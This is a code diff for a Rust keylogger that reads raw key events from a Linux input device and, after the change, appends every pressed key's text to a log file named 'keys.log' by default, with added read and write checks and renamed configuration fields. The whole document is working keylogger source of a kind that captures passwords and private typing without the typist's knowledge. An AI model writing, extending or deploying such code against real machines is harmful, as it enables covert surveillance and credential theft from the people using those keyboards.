@@ -6,9 +6,9 @@ extern crate libc;
 extern crate log;
 
 use std::process::{exit, Command};
-use std::fs::File;
-use std::io::Read;
-use std::env;
+use std::fs::{File, OpenOptions};
+use std::io::{Read, Write};
+use std::{env, mem};
 
 use getopts::Options;
 
@@ -155,21 +155,34 @@ fn main() {
     let config = parse_args();
     debug!("Config: {:?}", config);
 
-    let mut device_file = File::open(&config.device_path).unwrap_or_else(|e| panic!("{}", e));
-    let mut buf: [u8; 24] = unsafe { std::mem::zeroed() };
+    let mut log_file = OpenOptions::new().create(true).write(true).append(true).open(config.log_file)
+        .unwrap_or_else(|e| panic!("{}", e));
+    let mut device_file = File::open(&config.device_file).unwrap_or_else(|e| panic!("{}", e));
+
+    // TODO: use the sizeof function (not available yet) instead of hard-coding 24.
+    let mut buf: [u8; 24] = unsafe { mem::zeroed() };
 
     // We use a u8 here instead of a bool to handle the rare case when both shift keys are pressed
     // and then one is released
     let mut shift_pressed = 0;
     loop {
-        device_file.read(&mut buf).unwrap();
-        let event: InputEvent = unsafe { std::mem::transmute(buf) };
+        let num_bytes = device_file.read(&mut buf).unwrap_or_else(|e| panic!("{}", e));
+        if num_bytes != mem::size_of::<InputEvent>() {
+            panic!("Error while reading from device file");
+        }
+        let event: InputEvent = unsafe { mem::transmute(buf) };
         if event.type_ == EV_KEY {
             if event.value == KEY_PRESS {
                 if is_shift(event.code) {
                     shift_pressed += 1;
                 }
-                println!("{:?}", get_key_text(event.code, shift_pressed));
+
+                let text = get_key_text(event.code, shift_pressed).as_bytes();
+                let num_bytes = log_file.write(text).unwrap_or_else(|e| panic!("{}", e));
+
+                if num_bytes != text.len() {
+                    panic!("Error while writing to log file");
+                }
             } else if event.value == KEY_RELEASE {
                 if is_shift(event.code) {
                     shift_pressed -= 1;
@@ -204,10 +217,10 @@ fn parse_args() -> Config {
         exit(0);
     }
 
-    let device_path = matches.opt_str("d").unwrap_or_else(|| get_default_device());
-    let filename = matches.opt_str("f").unwrap_or("keys.log".to_owned());
+    let device_file = matches.opt_str("d").unwrap_or_else(|| get_default_device());
+    let log_file = matches.opt_str("f").unwrap_or("keys.log".to_owned());
 
-    Config::new(device_path, filename)
+    Config::new(device_file, log_file)
 }
 
 fn get_default_device() -> String {
@@ -224,12 +237,12 @@ fn get_default_device() -> String {
 
 #[derive(Debug)]
 struct Config {
-    device_path: String,
-    filename: String
+    device_file: String,
+    log_file: String
 }
 
 impl Config {
-    fn new(device_path: String, filename: String) -> Self {
-        Config { device_path: device_path, filename: filename }
+    fn new(device_file: String, log_file: String) -> Self {
+        Config { device_file: device_file, log_file: log_file }
     }
 }
